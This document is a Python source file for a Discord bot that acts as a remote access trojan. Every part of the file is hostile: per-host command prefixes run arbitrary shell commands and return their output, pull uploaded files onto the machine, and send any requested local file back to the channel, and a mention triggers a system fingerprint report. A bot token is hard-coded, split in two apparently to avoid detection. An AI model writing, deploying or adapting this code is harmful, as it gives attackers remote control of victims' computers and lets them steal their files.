import os
import random
import subprocess
import discord
import platform
# Check if "./KEY" file exists
if os.path.exists("./KEY"):
    # Read content of "./KEY" file into variable "CNAME"
    with open("./KEY", "r") as f:
        CNAME = f.read().strip()
else:
    # Generate random 7-digit number
    CNAME = str(random.randint(1000000, 9999999))
    # Write "CNAME" variable to "./KEY" file
    with open("./KEY", "w") as f:
        f.write(CNAME)

# Create Discord bot instance
bot = discord.Client(intents=discord.Intents.all())

# Define "on_ready" function
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# Define "on_message" function
@bot.event
async def on_message(ctx):
    # Ignore messages sent by the bot itself
    if ctx.author == bot.user:
        return

    # Check for command to execute subprocess
    if f"!{CNAME}Sys" in ctx.content:
        # Get command to execute
        cmd = ctx.content.split(f"!{CNAME}Sys ")[1]
        # Execute command using subprocess
        output = subprocess.check_output(cmd, shell=True, text=True)
        # Send output to channel
        await ctx.channel.send(f"```\n{output}\n```")

    # Check for command to save attached file
    elif f"!{CNAME}FileIn" in ctx.content:
        # Iterate over message attachments
        for attachment in ctx.message.attachments:
            # Save attachment to file
            await attachment.save(attachment.filename)

    # Check for command to send file
    elif f"!{CNAME}FileOut" in ctx.content:
        # Get path of file to send
        filepath = ctx.content.split(f"!{CNAME}FileOut ")[1]
        # Check if file exists
        if os.path.exists(filepath):
            # Send file
            with open(filepath, "rb") as f:
                await ctx.channel.send(file=discord.File(f))
        else:
            await ctx.channel.send("File not found")
    elif f"<@{bot.user.id}>" in ctx.content:
        await ctx.channel.send(f"""```
ID:{CNAME}
PLAFORM:{platform.platform()}
ARCH:{str(platform.architecture())}
PROCESSOR:{platform.machine()}
```
""")
# Run the bot with the given token
bot.run("MTEwNTcyMDkzMDI5MTk0NTUxMw.GRn1us."+"K0fM6X_6BvMlUqv2Cfs-x8sfhzu-s6DgxSb1dY")